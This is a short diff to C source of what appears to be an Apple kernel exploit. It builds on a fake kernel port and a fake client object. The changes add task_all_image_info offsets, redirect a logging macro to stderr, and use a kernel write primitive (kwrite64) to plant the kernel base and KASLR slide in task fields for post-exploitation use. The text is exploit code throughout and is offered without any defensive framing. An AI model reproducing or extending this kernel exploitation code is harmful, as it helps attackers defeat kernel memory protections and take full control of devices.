@@ -80,6 +80,8 @@ typedef struct {
         uint32_t itk_registered;
         uint32_t ipr_size;
         uint32_t sizeof_task;
+		uint32_t task_all_image_info_addr;
+		uint32_t task_all_image_info_size;
     } struct_offsets;
 
     struct {
@@ -174,7 +176,7 @@ typedef struct
 } mach_msg_data_buffer_t;
 
 //#define LOG(str, args...) do { } while(0)
-#define LOG(str, args...) do {offsets->userland_funcs.write(1,str,1024);offsets->userland_funcs.write(1,"\n\n\n\n",4);} while(0)
+#define LOG(str, args...) do {offsets->userland_funcs.write(2,str,1024);offsets->userland_funcs.write(1,"\n\n\n\n",4);} while(0)
 #define KERN_INVALID_ARGUMENT 2
 #define KERN_FAILURE 1
 #define KERN_SUCCESS 0
@@ -485,6 +487,10 @@ void where_it_all_starts(kport_t * fakeport,void * fake_client,uint64_t ip_kobje
 
     offsets->userland_funcs.mach_port_destroy(offsets->userland_funcs.mach_task_self(), maps[0]);
     offsets->userland_funcs.mach_port_destroy(offsets->userland_funcs.mach_task_self(), maps[1]);
+
+	// setup kernel base and slide for post
+	kwrite64(remap_addr + offsets->struct_offsets.task_all_image_info_addr,offsets->constant.kernel_image_base + kslide);
+	kwrite64(remap_addr + offsets->struct_offsets.task_all_image_info_size,kslide);
 
     // remap must cover the entire struct and be page aligned 
     uint64_t remap_start = remap_addr & ~(pgsize - 1);
